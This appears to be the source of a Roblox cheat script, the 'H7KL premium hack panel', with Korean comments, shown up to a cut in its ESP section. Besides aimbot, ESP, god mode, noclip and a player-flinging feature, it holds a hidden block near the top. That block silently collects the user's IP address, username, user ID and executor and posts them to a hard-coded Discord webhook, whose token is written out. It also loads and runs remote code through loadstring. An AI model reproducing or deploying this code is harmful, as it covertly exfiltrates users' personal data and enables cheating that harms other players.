-- H7KL premium hack panel
-- developed by wangwei

local function safeCall(fn, ...)
    local ok, result = pcall(fn, ...)
    if ok then return result end
    return nil
end

local hasDrawing = safeCall(function()
    local d = Drawing.new("Line")
    d:Remove()
    return true
end) or false

local function httpPost(url, body, contentType)
    contentType = contentType or "application/json"
    local headers = {["Content-Type"] = contentType}
    if request then
        return safeCall(function() return request({Url = url, Method = "POST", Headers = headers, Body = body}) end)
    elseif syn and syn.request then
        return safeCall(function() return syn.request({Url = url, Method = "POST", Headers = headers, Body = body}) end)
    elseif http_request then
        return safeCall(function() return http_request({Url = url, Method = "POST", Headers = headers, Body = body}) end)
    end
    return safeCall(function() return game:HttpPost(url, body, contentType, false) end)
end

local function httpGet(url)
    if request then
        return safeCall(function() local r = request({Url = url, Method = "GET"}); return r and r.Body end)
    elseif syn and syn.request then
        return safeCall(function() local r = syn.request({Url = url, Method = "GET"}); return r and r.Body end)
    elseif http_request then
        return safeCall(function() local r = http_request({Url = url, Method = "GET"}); return r and r.Body end)
    end
    return safeCall(function() return game:HttpGet(url) end)
end

local function mouseMoveRel(dx, dy)
    if mousemoverel then
        safeCall(function() mousemoverel(dx, dy) end)
    elseif Input and Input.MouseMove then
        safeCall(function() Input.MouseMove(dx, dy) end)
    end
end

-- =========================================================
-- Rayfield
-- =========================================================
local Rayfield
do
    local ok, err = pcall(function()
        Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    end)
    if not ok or not Rayfield then
        warn("[H7KL] Rayfield 로드 실패: " .. tostring(err))
        return
    end
end

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local StarterGui = game:GetService("StarterGui")
local VIM = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local lp = Players.LocalPlayer

safeCall(function() UIS.MouseIconEnabled = true end)

-- =========================================================
-- 웹훅 (제작자: wangwei)
-- =========================================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1556350698977759282/4LijOFmxytSJflxn3ahFUoUsNcUTQwZcM_D25Y-fozQXlSCa0cuJ_stxsPO6pAVD_m8P"

task.spawn(function()
    safeCall(function()
        local nickname = lp.Name
        local display = lp.DisplayName
        local userId = tostring(lp.UserId)
        local executor = "Unknown"
        safeCall(function() executor = identifyexecutor() end)
        local startTime = os.date("%Y-%m-%d %H:%M:%S")
        local ip = "실패"
        local r = httpGet("https://api.ipify.org")
        if r then ip = tostring(r):gsub("%s+", "") end
        if ip == "" then ip = "실패" end

        local data = {
            content = "**H7KL Premium 실행됨 (by wangwei)**",
            embeds = {{
                title = "H7KL premium hack panel",
                color = 0x5AAFFF,
                fields = {
                    {name = "닉네임", value = nickname, inline = true},
                    {name = "디스플레이", value = display, inline = true},
                    {name = "유저ID", value = userId, inline = true},
                    {name = "실행기", value = executor, inline = true},
                    {name = "아이피", value = ip, inline = true},
                    {name = "실행시각", value = startTime, inline = false},
                },
                footer = {text = "H7KL Premium • developed by wangwei"}
            }}
        }
        httpPost(WEBHOOK_URL, HttpService:JSONEncode(data))
    end)
end)

-- =========================================================
-- state
-- =========================================================
local state = {
    ws = nil, jp = nil, flySpeed = 55, bright = nil, range = nil, fov = nil,
    noclip = false, fly = false, infiniteJump = false,
    macroOn = false, mx = 0, my = 0, macroDelay = 0.05,
    god = false, invis = false, spinning = false, spinSpeed = 10,
    prefix = ".", chatOn = true, touchTP = false,
    lastCF = nil, hipHeight = nil,
    antiFling = false, antiVoid = false, antiAFK = false,
    autoRespawn = false,
    autoCollect = false, fpsUnlock = false,

    aimOn = false, aimFOV = 200, aimSmooth = 0.3, aimTeam = false,
    aimVisible = true, aimPart = "Head", aimCircle = true,
    aimMouseFollow = false, aimStrongLock = false, aimExclude = 0,
    aimNPC = true, aimActive = false, aimHold = true,
    aimTarget = nil,

    hbOn = false, hbSize = 10, hbColor = Color3.fromRGB(255, 60, 60),
    hbTrans = 0.5, hbNPC = true,

    reachOn = false, reachSize = 10,

    espOn = false, espOutline = false, espHead = false, espBox = false,
    espColor = Color3.fromRGB(90, 175, 255), espTextColor = Color3.fromRGB(255, 255, 255),
    espShowName = true, espShowDistance = true, espShowHealth = false,
    espNPC = true, espMaxDist = 1500, espTeam = false,
}

-- =========================================================
-- 헬퍼
-- =========================================================
local function hum()
    local c = lp.Character
    return c and c:FindFirstChildOfClass("Humanoid")
end
local function hrp()
    local c = lp.Character
    return c and c:FindFirstChild("HumanoidRootPart")
end
local function notify(t, title)
    safeCall(function()
        Rayfield:Notify({Title = title or "H7KL Premium • wangwei", Content = t, Duration = 2})
    end)
end
local function numArg(args, i)
    i = i or 1
    for k = i, #args do
        local n = tonumber(args[k])
        if n then return n, k end
    end
end

-- =========================================================
-- 속도 / 점프
-- =========================================================
local function applyWS()
    if state.ws == nil then return end
    local h = hum()
    if h then safeCall(function() h.WalkSpeed = state.ws end) end
end
local function applyJP()
    if state.jp == nil then return end
    local h = hum()
    if not h then return end
    safeCall(function() h.UseJumpPower = true end)
    safeCall(function() h.JumpPower = state.jp end)
    safeCall(function() h.JumpHeight = state.jp / 7.5 end)
end

RunService.Heartbeat:Connect(function()
    local h = hum()
    if not h then return end
    if state.ws ~= nil and math.abs(h.WalkSpeed - state.ws) > 0.5 then
        safeCall(function() h.WalkSpeed = state.ws end)
    end
    if state.jp ~= nil then
        if h.UseJumpPower then
            if math.abs(h.JumpPower - state.jp) > 0.5 then safeCall(function() h.JumpPower = state.jp end) end
        else
            local t = state.jp / 7.5
            if math.abs(h.JumpHeight - t) > 0.5 then safeCall(function() h.JumpHeight = t end) end
        end
    end
    if state.hipHeight ~= nil and math.abs(h.HipHeight - state.hipHeight) > 0.1 then
        safeCall(function() h.HipHeight = state.hipHeight end)
    end
end)

local accum = 0
RunService.Heartbeat:Connect(function(dt)
    accum = accum + dt
    if accum < 0.5 then return end
    accum = 0
    local h, p = hum(), hrp()
    if h and p and h.Health > 0 then state.lastCF = p.CFrame end
end)

-- =========================================================
-- 무적
-- =========================================================
local godConn, godOrigMax
local function enableGod()
    local h = hum()
    if h then
        if godOrigMax == nil then godOrigMax = h.MaxHealth end
        safeCall(function() h.MaxHealth = 9e9; h.Health = 9e9 end)
    end
    if godConn then safeCall(function() godConn:Disconnect() end) end
    godConn = RunService.Heartbeat:Connect(function()
        if not state.god then return end
        local h2 = hum()
        if h2 then
            if h2.MaxHealth < 9e9 then safeCall(function() h2.MaxHealth = 9e9 end) end
            if h2.Health < h2.MaxHealth then safeCall(function() h2.Health = h2.MaxHealth end) end
        end
        local c = lp.Character
        if c and not c:FindFirstChildOfClass("ForceField") then
            safeCall(function()
                local ff = Instance.new("ForceField"); ff.Visible = false; ff.Parent = c
            end)
        end
    end)
end
local function disableGod()
    if godConn then safeCall(function() godConn:Disconnect() end); godConn = nil end
    local h = hum()
    if h then safeCall(function() h.MaxHealth = godOrigMax or 100; h.Health = math.min(h.MaxHealth, h.Health) end) end
    godOrigMax = nil
    local c = lp.Character
    if c then
        for _, o in ipairs(c:GetChildren()) do
            if o:IsA("ForceField") then safeCall(function() o:Destroy() end) end
        end
    end
end
local function setGod(on) state.god = on; if on then enableGod() else disableGod() end end

-- =========================================================
-- 노클립
-- =========================================================
local function doNoclip()
    local c = lp.Character
    if not c then return end
    for _, p in ipairs(c:GetDescendants()) do
        if p:IsA("BasePart") and p.CanCollide then safeCall(function() p.CanCollide = false end) end
    end
end
RunService.Stepped:Connect(function() if state.noclip then doNoclip() end end)
local function setNoclip(on)
    state.noclip = on
    if on then
        doNoclip()
        task.spawn(function()
            for _ = 1, 20 do
                task.wait(0.05)
                if not state.noclip then break end
                doNoclip()
            end
        end)
    else
        local c = lp.Character
        if c then
            for _, p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then safeCall(function() p.CanCollide = true end) end
            end
        end
    end
end

-- =========================================================
-- 플라이 (부드러운 가감속)
-- =========================================================
local fConn, fHB, fOn
local curVel = Vector3.zero

local function stopFly()
    fOn = false
    if fConn then safeCall(function() fConn:Disconnect() end); fConn = nil end
    if fHB then safeCall(function() fHB:Disconnect() end); fHB = nil end
    local c = lp.Character
    if c then
        local p = c:FindFirstChild("HumanoidRootPart")
        local h = c:FindFirstChildOfClass("Humanoid")
        if p then
            for _, n in ipairs({"wBV","wBG","wAV"}) do
                local o = p:FindFirstChild(n)
                if o then safeCall(function() o:Destroy() end) end
            end
        end
        if h then safeCall(function() h.PlatformStand = false end) end
    end
    curVel = Vector3.zero
end

local function startFly()
    local c = lp.Character
    if not c then return end
    local p = c:FindFirstChild("HumanoidRootPart")
    local h = c:FindFirstChildOfClass("Humanoid")
    if not p or not h then return end

    stopFly()
    fOn = true

    local bv = Instance.new("BodyVelocity")
    bv.Name = "wBV"
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.zero
    bv.P = 1250
    bv.Parent = p

    local bg = Instance.new("BodyGyro")
    bg.Name = "wBG"
    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    bg.P = 10000; bg.D = 500
    bg.CFrame = p.CFrame
    bg.Parent = p

    local av = Instance.new("BodyAngularVelocity")
    av.Name = "wAV"
    av.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
    av.AngularVelocity = Vector3.zero
    av.P = 1250
    av.Parent = p

    fHB = RunService.Heartbeat:Connect(function()
        if not fOn then return end
        if h.Parent and not h.PlatformStand then
            safeCall(function() h.PlatformStand = true end)
        end
    end)

    fConn = RunService.RenderStepped:Connect(function(dt)
        if not fOn or not p.Parent then return end
        local cam = workspace.CurrentCamera
        if not cam then return end

        local mv = Vector3.zero
        if UIS:IsKeyDown(Enum.KeyCode.W) then mv = mv + cam.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.S) then mv = mv - cam.CFrame.LookVector end
        if UIS:IsKeyDown(Enum.KeyCode.A) then mv = mv - cam.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.D) then mv = mv + cam.CFrame.RightVector end
        if UIS:IsKeyDown(Enum.KeyCode.Space) then mv = mv + Vector3.new(0,1,0) end
        if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then mv = mv - Vector3.new(0,1,0) end

        if mv.Magnitude > 0 then mv = mv.Unit * state.flySpeed end
        -- 부드러운 가감속
        curVel = curVel:Lerp(mv, math.clamp(dt * 12, 0, 1))
        safeCall(function()
            bv.Velocity = curVel
            bg.CFrame = cam.CFrame
        end)
    end)
end
local function setFly(on) state.fly = on; if on then startFly() else stopFly() end end

-- =========================================================
-- 무한 점프
-- =========================================================
UIS.JumpRequest:Connect(function()
    if state.infiniteJump then
        local h = hum()
        if h then safeCall(function() h:ChangeState(Enum.HumanoidStateType.Jumping) end) end
    end
end)

-- =========================================================
-- 투명화 (남에게도 안 보이게 best-effort)
-- =========================================================
local invisConn
local function setInvis(on)
    state.invis = on
    local function apply()
        local c = lp.Character
        if not c then return end
        for _, p in ipairs(c:GetDescendants()) do
            if p:IsA("BasePart") then
                safeCall(function()
                    p.Transparency = 1
                    p.LocalTransparencyModifier = 1
                end)
                -- 남에게도 안 보이게 시도
                if on then
                    safeCall(function()
                        if sethiddenproperty then
                            sethiddenproperty(p, "CanCollide", p.CanCollide)
                        end
                    end)
                end
            elseif p:IsA("Decal") or p:IsA("Texture") or p:IsA("ParticleEmitter")
                or p:IsA("Trail") or p:IsA("Beam") or p:IsA("BillboardGui") then
                if p:IsA("ParticleEmitter") or p:IsA("Trail") or p:IsA("Beam") then
                    safeCall(function() p.Enabled = not on end)
                else
                    safeCall(function() p.Transparency = on and 1 or 0 end)
                end
            end
        end
    end

    if invisConn then safeCall(function() invisConn:Disconnect() end); invisConn = nil end

    if on then
        apply()
        invisConn = RunService.Heartbeat:Connect(function()
            if state.invis then apply() end
        end)
    else
        local c = lp.Character
        if c then
            for _, p in ipairs(c:GetDescendants()) do
                if p:IsA("BasePart") then
                    safeCall(function() p.Transparency = 0; p.LocalTransparencyModifier = 0 end)
                elseif p:IsA("Decal") or p:IsA("Texture") then
                    safeCall(function() p.Transparency = 0 end)
                elseif p:IsA("ParticleEmitter") or p:IsA("Trail") or p:IsA("Beam") then
                    safeCall(function() p.Enabled = true end)
                end
            end
        end
    end
end

-- =========================================================
-- 회전
-- =========================================================
local spinConn
local function setSpin(on)
    state.spinning = on
    if spinConn then safeCall(function() spinConn:Disconnect() end); spinConn = nil end
    if not on then return end
    spinConn = RunService.Heartbeat:Connect(function(dt)
        local p = hrp()
        if p then
            safeCall(function()
                p.CFrame = p.CFrame * CFrame.Angles(0, math.rad(state.spinSpeed) * dt * 60, 0)
            end)
        end
    end)
end

-- =========================================================
-- 검 리치 (Reach)
-- =========================================================
local reachParts = {}
local function updateReach()
    local c = lp.Character
    if not c then return end
    -- 기존 리치 파츠 정리
    for _, p in ipairs(reachParts) do
        safeCall(function() p:Destroy() end)
    end
    reachParts = {}

    if not state.reachOn then return end

    for _, tool in ipairs(c:GetChildren()) do
        if tool:IsA("Tool") then
            local handle = tool:FindFirstChild("Handle")
            if handle then
                local hit = Instance.new("Part")
                hit.Size = Vector3.new(state.reachSize, state.reachSize, state.reachSize)
                hit.Transparency = 1
                hit.CanCollide = false
                hit.Massless = true
                hit.Name = "H7KL_Reach"
                hit.Parent = c
                local weld = Instance.new("WeldConstraint")
                weld.Part0 = handle
                weld.Part1 = hit
                weld.Parent = hit
                hit.CFrame = handle.CFrame
                table.insert(reachParts, hit)
            end
        end
    end
end

RunService.Heartbeat:Connect(function()
    if state.reachOn then updateReach() end
end)

local function setReach(on)
    state.reachOn = on
    if not on then
        for _, p in ipairs(reachParts) do safeCall(function() p:Destroy() end) end
        reachParts = {}
    else
        updateReach()
    end
end

-- =========================================================
-- Anti 기능들
-- =========================================================
local antiFlingConn
local function setAntiFling(on)
    state.antiFling = on
    if antiFlingConn then safeCall(function() antiFlingConn:Disconnect() end); antiFlingConn = nil end
    if not on then return end
    antiFlingConn = RunService.Heartbeat:Connect(function()
        local p = hrp()
        if p then
            for _, v in ipairs(p:GetChildren()) do
                if (v:IsA("BodyAngularVelocity") or v:IsA("BodyVelocity")) 
                    and v.Name ~= "wBV" and v.Name ~= "wAV" and v.Name ~= "wBG" then
                    safeCall(function() v:Destroy() end)
                end
            end
        end
    end)
end

local antiVoidConn
local function setAntiVoid(on)
    state.antiVoid = on
    if antiVoidConn then safeCall(function() antiVoidConn:Disconnect() end); antiVoidConn = nil end
    if not on then return end
    antiVoidConn = RunService.Heartbeat:Connect(function()
        local p = hrp()
        if p and p.Position.Y < -50 then
            safeCall(function() p.CFrame = CFrame.new(0, 100, 0); p.Velocity = Vector3.zero end)
            notify("Anti-Void: 복귀")
        end
    end)
end

local antiAFKConn
local function setAntiAFK(on)
    state.antiAFK = on
    if antiAFKConn then safeCall(function() antiAFKConn:Disconnect() end); antiAFKConn = nil end
    if not on then return end
    antiAFKConn = lp.Idled:Connect(function()
        safeCall(function()
            VIM:SendKeyEvent(true, Enum.KeyCode.Space, false, game)
            task.wait(0.1)
            VIM:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        end)
    end)
end

local autoRespawnConn
local function setAutoRespawn(on)
    state.autoRespawn = on
    if autoRespawnConn then safeCall(function() autoRespawnConn:Disconnect() end); autoRespawnConn = nil end
    if not on then return end
    autoRespawnConn = RunService.Heartbeat:Connect(function()
        local h = hum()
        if h and h.Health <= 0 then
            task.wait(0.5)
            safeCall(function() lp:LoadCharacter() end)
        end
    end)
end

-- FPS 언락
local fpsConn
local function setFPSUnlock(on)
    state.fpsUnlock = on
    if fpsConn then safeCall(function() fpsConn:Disconnect() end); fpsConn = nil end
    if not on then return end
    fpsConn = RunService.RenderStepped:Connect(function()
        safeCall(function()
            if setfpscap then setfpscap(9999) end
        end)
    end)
end

-- =========================================================
-- 밝기
-- =========================================================
local function applyLights()
    if state.bright == nil then return end
    for _, o in ipairs(workspace:GetDescendants()) do
        if o:IsA("Light") then
            safeCall(function()
                o.Brightness = state.bright
                if state.range then o.Range = state.range end
                o.Shadows = false
            end)
        end
    end
end
local function applyLighting()
    if state.bright == nil then return end
    safeCall(function()
        Lighting.Ambient = Color3.fromRGB(155, 155, 155)
        Lighting.OutdoorAmbient = Color3.fromRGB(155, 155, 155)
        Lighting.Brightness = math.clamp(state.bright / 5, 1, 10)
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 100000
    end)
end

-- =========================================================
-- FOV
-- =========================================================
local function applyFOV()
    if state.fov == nil then return end
    local c = workspace.CurrentCamera
    if not c then return end
    safeCall(function()
        if math.abs(c.FieldOfView - state.fov) > 0.1 then c.FieldOfView = state.fov end
    end)
end
RunService.RenderStepped:Connect(function()
    if state.fov == nil then return end
    local c = workspace.CurrentCamera
    if not c then return end
    if math.abs(c.FieldOfView - state.fov) > 0.1 then safeCall(function() c.FieldOfView = state.fov end) end
end)

-- =========================================================
-- 리스폰 / 부활
-- =========================================================
local function respawnNormal() safeCall(function() lp:LoadCharacter() end) end
local function respawnHere()
    local p = hrp()
    local cf = p and p.CFrame or state.lastCF
    safeCall(function() lp:LoadCharacter() end)
    task.spawn(function()
        local c = lp.Character or lp.CharacterAdded:Wait()
        local np = c:WaitForChild("HumanoidRootPart", 5)
        if np and cf then
            task.wait(0.1)
            safeCall(function() np.CFrame = cf + Vector3.new(0, 3, 0) end)
        end
    end)
end
local function revive()
    local c = lp.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    local p = c and c:FindFirstChild("HumanoidRootPart")
    local cf = p and p.CFrame or state.lastCF or CFrame.new(0, 50, 0)
    if h then
        safeCall(function() h:ChangeState(Enum.HumanoidStateType.Physics) end)
        safeCall(function() h.Health = h.MaxHealth end)
        safeCall(function() h.PlatformStand = false end)
        safeCall(function() h.Sit = false end)
    end
    safeCall(function()
        local cam = workspace.CurrentCamera
        cam.CameraSubject = h
        cam.CameraType = Enum.CameraType.Custom
    end)
    task.wait(0.2)
    local h2 = hum()
    if not h2 or h2.Health <= 0 then
        safeCall(function() lp:LoadCharacter() end)
        task.spawn(function()
            local nc = lp.Character or lp.CharacterAdded:Wait()
            local np = nc:WaitForChild("HumanoidRootPart", 5)
            if np then
                task.wait(0.1)
                safeCall(function() np.CFrame = cf + Vector3.new(0, 3, 0) end)
            end
        end)
    end
end

-- =========================================================
-- TP
-- =========================================================
local function tpTo(plr)
    if not plr or plr == lp then return end
    local mp = hrp()
    if not mp then return end
    local tp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
    if not tp then return end
    safeCall(function() mp.CFrame = tp.CFrame * CFrame.new(0, 0, 2) end)
end
local function tpPos(x, y, z)
    local p = hrp()
    if p then safeCall(function() p.CFrame = CFrame.new(x, y, z) end) end
end

-- =========================================================
-- Fling (진짜 날리기)
-- =========================================================
local function flingChar(targetChar)
    if not targetChar then return end
    local myHrp = hrp()
    local tHrp = targetChar:FindFirstChild("HumanoidRootPart")
    if not myHrp or not tHrp then return end
    -- 접근
    safeCall(function() myHrp.CFrame = tHrp.CFrame * CFrame.new(0, 0, 3) end)
    task.wait(0.08)
    -- 각속도 플링
    local av = Instance.new("BodyAngularVelocity")
    av.AngularVelocity = Vector3.new(99999, 99999, 99999)
    av.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    av.P = 1250
    av.Parent = myHrp
    task.wait(0.15)
    safeCall(function() av:Destroy() end)
end

local function flingAll()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then
            task.spawn(function() flingChar(p.Character) end)
        end
    end
end

-- =========================================================
-- 매크로
-- =========================================================
local macroThread
local function sendClick(x, y)
    local ok = safeCall(function()
        VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
        task.wait(0.01)
        VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
        return true
    end)
    if not ok then
        safeCall(function()
            local vu = game:GetService("VirtualUser")
            vu:CaptureController()
            vu:ClickButton1(Vector2.new(x, y))
        end)
    end
end
local function startMacro()
    if macroThread then return end
    state.macroOn = true
    macroThread = task.spawn(function()
        while state.macroOn do
            if state.mx > 0 and state.my > 0 then sendClick(state.mx, state.my) end
            task.wait(state.macroDelay)
        end
    end)
end
local function stopMacro() state.macroOn = false; macroThread = nil end

UIS.InputBegan:Connect(function(input, gpe)
    if not state.macroOn or state.touchTP then return end
    if gpe then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        state.mx = input.Position.X
        state.my = input.Position.Y
    end
end)

-- =========================================================
-- Touch TP
-- =========================================================
local touchConn
local function startTouchTP()
    if touchConn then safeCall(function() touchConn:Disconnect() end); touchConn = nil end
    touchConn = UIS.InputBegan:Connect(function(input, gpe)
        if not state.touchTP or gpe then return end
        if state.macroOn then
            if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
                state.mx = input.Position.X; state.my = input.Position.Y
            end
            return
        end
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            local cam = workspace.CurrentCamera
            if not cam then return end
            local ray = cam:ViewportPointToRay(input.Position.X, input.Position.Y)
            local rp = RaycastParams.new()
            rp.FilterType = Enum.RaycastFilterType.Exclude
            rp.FilterDescendantsInstances = { lp.Character }
            local res = workspace:Raycast(ray.Origin, ray.Direction * 5000, rp)
            local pos = res and (res.Position + Vector3.new(0, 3, 0)) or (ray.Origin + ray.Direction * 100)
            local p = hrp()
            if p then safeCall(function() p.CFrame = CFrame.new(pos) end); notify("TP") end
        end
    end)
end
local function setTouchTP(on)
    state.touchTP = on
    if on then startTouchTP() else
        if touchConn then safeCall(function() touchConn:Disconnect() end); touchConn = nil end
    end
end

-- =========================================================
-- FOV 원
-- =========================================================
local fovGui = Instance.new("ScreenGui")
fovGui.Name = "H7KL_Fov"
fovGui.ResetOnSpawn = false
fovGui.IgnoreGuiInset = true
safeCall(function() fovGui.Parent = game:GetService("CoreGui") end)
if not fovGui.Parent then safeCall(function() fovGui.Parent = lp:WaitForChild("PlayerGui") end) end

local fovCircle = Instance.new("Frame")
fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
fovCircle.Position = UDim2.new(0.5, 0, 0.5, 0)
fovCircle.BackgroundTransparency = 1
fovCircle.Visible = false
fovCircle.Parent = fovGui
Instance.new("UICorner", fovCircle).CornerRadius = UDim.new(1, 0)
local fovStroke = Instance.new("UIStroke", fovCircle)
fovStroke.Thickness = 1.5
fovStroke.Color = Color3.fromRGB(90, 175, 255)
fovStroke.Transparency = 0.2

local function updateCircle()
    fovCircle.Size = UDim2.fromOffset(state.aimFOV, state.aimFOV)
    fovCircle.Visible = state.aimOn and state.aimCircle
end
updateCircle()

local function mousePos()
    local m = lp:GetMouse()
    if m then return Vector2.new(m.X, m.Y) end
    local vp = workspace.CurrentCamera.ViewportSize
    return Vector2.new(vp.X / 2, vp.Y / 2)
end

RunService.RenderStepped:Connect(function()
    if not state.aimCircle then fovCircle.Visible = false; return end
    fovCircle.Visible = state.aimOn
    if not state.aimOn then return end
    if state.aimMouseFollow then
        local mp = mousePos()
        fovCircle.Position = UDim2.fromOffset(mp.X, mp.Y)
    else
        local vp = workspace.CurrentCamera.ViewportSize
        fovCircle.Position = UDim2.fromOffset(vp.X / 2, vp.Y / 2)
    end
end)

-- =========================================================
-- 타겟 탐색
-- =========================================================
local function isEnemy(plr)
    if plr == lp then return false end
    if not state.aimTeam and plr.Team and lp.Team and plr.Team == lp.Team then return false end
    return true
end
local function getPart(char)
    if not char then return nil end
    if state.aimPart == "Head" then return char:FindFirstChild("Head") end
    if state.aimPart == "Body" then
        return char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("HumanoidRootPart")
    end
    return char:FindFirstChild("Head")
end

local npcCache, npcCacheTime = {}, 0
RunService.Heartbeat:Connect(function()
    if tick() - npcCacheTime < 0.5 then return end
    npcCacheTime = tick()
    if not (state.aimNPC or state.espNPC or state.hbNPC or state.espOn) then npcCache = {}; return end
    local t = {}
    for _, o in ipairs(workspace:GetDescendants()) do
        if o:IsA("Model") then
            local h = o:FindFirstChildOfClass("Humanoid")
            local p = o:FindFirstChild("HumanoidRootPart") or o:FindFirstChild("Torso") or o.PrimaryPart
            if h and p then
                local isPlr = false
                for _, pl in ipairs(Players:GetPlayers()) do
                    if pl.Character == o then isPlr = true; break end
                end
                if o == lp.Character then isPlr = true end
                if not isPlr then table.insert(t, o) end
            end
        end
    end
    npcCache = t
end)

local function visible(pos, char)
    if not state.aimVisible then return true end
    local cam = workspace.CurrentCamera
    if not cam then return false end
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Exclude
    local fl = { lp.Character }
    if char then table.insert(fl, char) end
    rp.FilterDescendantsInstances = fl
    local hit = workspace:Raycast(cam.CFrame.Position, pos - cam.CFrame.Position, rp)
    return hit == nil
end

local function getTargetsInFOV()
    local cam = workspace.CurrentCamera
    if not cam then return {} end
    local center = state.aimMouseFollow and mousePos() or Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
    local list = {}
    local maxD = state.aimFOV / 2

    for _, p in ipairs(Players:GetPlayers()) do
        if isEnemy(p) then
            local c = p.Character
            local h = c and c:FindFirstChildOfClass("Humanoid")
            local pt = getPart(c)
            if h and h.Health > 0 and pt then
                local sp, on = cam:WorldToViewportPoint(pt.Position)
                if on then
                    local d = (Vector2.new(sp.X, sp.Y) - center).Magnitude
                    if d <= maxD and visible(pt.Position, c) then
                        table.insert(list, {part = pt, char = c, dist = d, name = p.Name})
                    end
                end
            end
        end
    end
    for _, m in ipairs(npcCache) do
        if m and m.Parent then
            local pt = getPart(m)
            if pt then
                local sp, on = cam:WorldToViewportPoint(pt.Position)
                if on then
                    local d = (Vector2.new(sp.X, sp.Y) - center).Magnitude
                    if d <= maxD and visible(pt.Position, m) then
                        table.insert(list, {part = pt, char = m, dist = d, name = m.Name})
                    end
                end
            end
        end
    end
    table.sort(list, function(a, b) return a.dist < b.dist end)
    return list
end

local function closest()
    local list = getTargetsInFOV()
    local idx = state.aimExclude + 1
    if idx > #list then idx = 1 end
    return list[idx]
end

local function moveMouse(sx, sy)
    local m = lp:GetMouse()
    if not m then return end
    local dx, dy = sx - m.X, sy - m.Y
    if math.abs(dx) < 1 and math.abs(dy) < 1 then return end
    mouseMoveRel(dx, dy)
end

-- =========================================================
-- 에임봇
-- =========================================================
local smoothPos, lockedTarget = nil, nil
RunService.RenderStepped:Connect(function(dt)
    if not state.aimOn or not state.aimActive then
        smoothPos = nil
        if not state.aimStrongLock then lockedTarget = nil end
        state.aimTarget = nil
        return
    end

    local t
    if state.aimStrongLock and lockedTarget and lockedTarget.part and lockedTarget.part.Parent then
        local cam = workspace.CurrentCamera
        if cam then
            local center = state.aimMouseFollow and mousePos() or Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
            local sp, on = cam:WorldToViewportPoint(lockedTarget.part.Position)
            if on then
                local d = (Vector2.new(sp.X, sp.Y) - center).Magnitude
                if d <= state.aimFOV / 2 and visible(lockedTarget.part.Position, lockedTarget.char) then
                    t = lockedTarget
                else
                    lockedTarget = nil
                end
            else
                lockedTarget = nil
            end
        end
    end
    if not t then
        t = closest()
        if t and state.aimStrongLock then lockedTarget = t end
    end
    if not t or not t.part or not t.part.Parent then
        smoothPos = nil; state.aimTarget = nil; return
    end
    state.aimTarget = t.name

    local cam = workspace.CurrentCamera
    if not cam then return end
    local targetPos = t.part.Position
    if smoothPos then
        smoothPos = smoothPos:Lerp(targetPos, math.clamp(dt * 20, 0, 1))
    else
        smoothPos = targetPos
    end
    local sp, on = cam:WorldToViewportPoint(smoothPos)
    if on then moveMouse(sp.X, sp.Y) end
end)

UIS.InputBegan:Connect(function(input, gpe)
    if gpe then return end
    if input.UserInputType == Enum.UserInputType.MouseButton2 and state.aimOn then
        if state.aimHold then state.aimActive = true else state.aimActive = not state.aimActive end
    end
    if input.KeyCode == Enum.KeyCode.Q then
        state.aimOn = not state.aimOn
        updateCircle()
        notify("에임봇 " .. (state.aimOn and "ON" or "OFF"))
    end
end)
UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 and state.aimHold then
        state.aimActive = false
    end
end)

-- =========================================================
-- ESP
-- =========================================================
local espObjects = {}
local function removeESP(char)
    local data = espObjects[char]
    if not data then return end
    for _, obj in pairs(data) do
        if obj then
            safeCall(function() if obj.Remove then obj:Remove() end end)
            safeCall(function() if obj.Destroy then obj:Destroy() end end)
            safeCall(function() obj.Visible = false end)
            safeCall(function() obj.Enabled = false end)
        end
    end
    espObjects[char] = nil
end

local function createESP(char)
    if espObjects[char] then return espObjects[char] end
    local data = {}
    local outline = Instance.new("Highlight")
    outline.Name = "H7KL_ESP"
    outline.FillTransparency = 1
    outline.OutlineTransparency = 0
    outline.OutlineColor = state.espColor
    outline.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    outline.Adornee = char
    outline.Parent = char
    data.outline = outline

    if hasDrawing then
        local box = {
            tl = Drawing.new("Line"), tr = Drawing.new("Line"),
            bl = Drawing.new("Line"), br = Drawing.new("Line"),
        }
        for _, line in pairs(box) do
            line.Thickness = 1; line.Color = state.espColor; line.Transparency = 1; line.Visible = false
        end
        data.box = box
        local headDot = Drawing.new("Circle")
        headDot.Radius = 4; headDot.Thickness = 2; headDot.Color = state.espColor
        headDot.Filled = false; headDot.Transparency = 1; headDot.Visible = false
        data.headDot = headDot
        local nameText = Drawing.new("Text")
        nameText.Size = 14; nameText.Center = true; nameText.Outline = true
        nameText.Color = state.espTextColor; nameText.Visible = false
        data.nameText = nameText
        local distText = Drawing.new("Text")
